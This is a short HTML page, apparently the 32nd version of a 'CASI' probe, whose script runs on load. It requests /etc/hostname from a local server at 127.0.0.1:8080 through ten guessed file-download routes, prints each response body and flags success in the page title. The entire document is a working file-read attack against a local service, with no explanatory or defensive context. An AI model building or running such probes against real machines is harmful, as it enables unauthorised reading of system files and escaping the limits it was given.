<!doctype html><html><head><meta charset="utf-8"><title>CASI file routes v32</title><style>body{font:13px monospace}pre{white-space:pre-wrap;border:1px solid #333;padding:6px}</style></head><body><h1>File-route results</h1><div id="o"></div><script>
const p=encodeURIComponent('/etc/hostname'),t=[['file-path','/file?path='+p],['file-filename','/file?filename='+p],['download-name','/download?name='+p],['download-path','/download?path='+p],['download-file','/download?file='+p],['files-name','/files?name='+p],['getfile-name','/getfile?name='+p],['media-name','/media?name='+p],['api-file','/api/file?name='+p],['api-download','/api/download?name='+p]];
(async()=>{const z=await Promise.all(t.map(async([l,u])=>{try{const r=await fetch('http://127.0.0.1:8080'+u,{cache:'no-store'}),x=await r.text();return l+' STATUS='+r.status+' BODY='+JSON.stringify(x.slice(0,1000));}catch(e){return l+' ERROR='+e.name+':'+e.message}}));document.title=z.some(x=>/STATUS=200/.test(x))?'CASI V32 SUCCESS':'CASI V32 NO200';for(const s of z){const p=document.createElement('pre');p.textContent=s;document.getElementById('o').appendChild(p)}})();
</script></body></html>
